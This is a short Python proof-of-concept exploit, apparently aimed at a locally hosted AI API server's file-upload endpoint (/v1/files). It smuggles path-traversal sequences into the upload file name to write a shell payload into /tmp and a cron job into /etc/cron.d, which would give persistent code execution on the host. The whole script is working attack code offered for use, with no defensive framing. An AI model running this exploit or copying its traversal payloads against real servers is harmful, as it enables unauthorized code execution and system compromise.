import requests

url = "http://127.0.0.1:7861/v1/files?purpose=assistants"

# Adjust this to your desired path (with traversal if needed)
target_path = "../../../../../../../../../../tmp/payload.sh"
cron_path = "../../../../../../../../../../etc/cron.d/cronpwn"

# --- Upload payload.sh to /tmp/payload.sh ---
with open("payload.sh", "rb") as f:
    files = {
        "file": (target_path, f, "application/x-sh")
    }
    r = requests.post(url, files=files)
    print("[+] payload.sh uploaded:", r.status_code)

# --- Upload cronjob to /etc/cron.d/pwnme ---
with open("cronjob", "rb") as f:
    files = {
        "file": (cron_path, f, "text/plain")
    }
    r = requests.post(url, files=files)
    print("[+] Cron job uploaded:", r.status_code)
